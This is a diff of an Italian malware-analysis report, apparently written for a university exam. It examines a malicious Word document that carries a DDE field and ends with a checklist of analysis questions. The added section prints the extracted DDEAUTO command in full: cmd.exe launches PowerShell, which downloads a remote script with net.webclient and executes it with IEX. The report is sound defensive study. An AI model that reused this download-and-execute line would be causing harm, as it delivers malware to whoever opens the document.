@@ -173,12 +173,37 @@ Procediamo quindi a verificare l'eventuale presenza di comandi DDE con un apposi
 
 Vediamo così un comando che effettua il download di un software malevolo. L'url _trt.doe.louisiana.gov_ non è purtroppo più raggiungibile e non possiamo quindi analizzare il malware che era previsto dover essere scaricato ed eseguito sulla macchina.
 
-===================================================
-===================================================
+Il codice del comando è il seguente:
+```
+command: DDEAUTO c:\\windows\\system32\\cmd.exe \/k powershell -C ;echo \\https://sec.gov/\\;IEX((new-object net.webclient).downloadstring(https://trt.doe.louisiana.gov/fonts.txt)) \
+```
+Troviamo quindi due url:
+- https://sec.gov/
+- https://trt.doe.louisiana.gov/fonts.txt
+
+Il primo viene solo stampato, il secondo come detto è relativo al download.
+
+## Altri potenziali pericoli
+
+[![oleid](./Screenshots/docx-oleid.png)]()
+
+Come vediamo da questa tabella riassuntiva di oleid non sembrano presenti altri pericoli, in particolare oltre all'assenza di macro vediamo che non vengono rilevati template injection. E' superfluo l'utilizzo di oleobj, a questo punto, ma possiamo provarlo comunque per averne la prova:
+
+[![oleobj](./Screenshots/docx-oleobj.png)]()
+
+Per concludere possiamo aprire il documento in una macchina virtuale per vedere come appare all'utente protagonista dell'attacco:
+
+[![screenshot](./Screenshots/docx-screenshot.png)]()
+
+================================================
+
+# Richieste per l'esame (sezione da eliminare)
+
+================================================
 
 # MALWARE
 ## OK Analisi statica di base
-    In questa sezione dovete riportare i risultati dell’analisi statica del PE del malware utilizzando tool quali PEstudio, ExeInfoPE or PEID. In particolare dovete rispondere alle seguenti domande:
+In questa sezione dovete riportare i risultati dell’analisi statica del PE del malware utilizzando tool quali PEstudio, ExeInfoPE or PEID. In particolare dovete rispondere alle seguenti domande:
 - OK Il malware e’ impacchettato? Se si quale packer e’ stato utilizzato? Quali  sono gli elementi del PE file che indicano che il malware e’ impacchettato?
 - OK Quali API vengono importate dal malware? Qual’e’ un possibile comportamento del malware in base alle API importate?
 - OK Quali stringhe sono contenute nel malware? Ci sono stringhe che possono che corrispondono a file o cartelle? Oppure sottochiavi del Windows registry? Oppure  URL? oppure indirizzi IP? 
@@ -190,15 +215,15 @@ In questa sezione dovete riportare i risultati dell’analisi dinamica del malwa
 - OK Il malware crea o cancella cartelle o file sulla macchina virtuale? Se si quali?
 - OK Il malware crea qualche altro processo?
 - OK Il malware e’ persistente sulla macchina virtuale? Se si, quale tecnica utilizza per raggiungere persistenza?
-## Analisi del traffico di rete
+## ~OK Analisi del traffico di rete
 In questa sezione dovete riportare i risultati dell’analisi del traffico di rete con Wireshark e Inetsim. In particolare, dovete rispondere alle seguenti domande:
 OK - Il malware inizia connessioni di rete? Se si che tipo di traffico genera?  Quali URL or indirizzi IP tenta di contattare?
  
 ## Reverse engineering della funzione indicata
 In questa sezione dovete spiegare il comportamento della funzione assegnata determinato facendo il reverse engineering del codice con IDA, Ghidra e x32dbg.
 
-# IL DOCUMENTO MALEVOLO
-## Analisi statica
+# ~OK IL DOCUMENTO MALEVOLO
+## ~OK Analisi statica
 In questa sezione dovete spiegare i risultati dell’analisi effettuata con strings (OK) , exiftool (OK), e yara (MANCA, fatto con msodde) Poi presentare i risultati ottenuti con i tool di analisi specifici per la tipologia di documento. Per esempio, se il documento è un pdf riportare i risultati ottenuti con pdfid, pdf-parser e peepdf.
  
 ## OK Analisi del codice malevolo contenuto nel documento
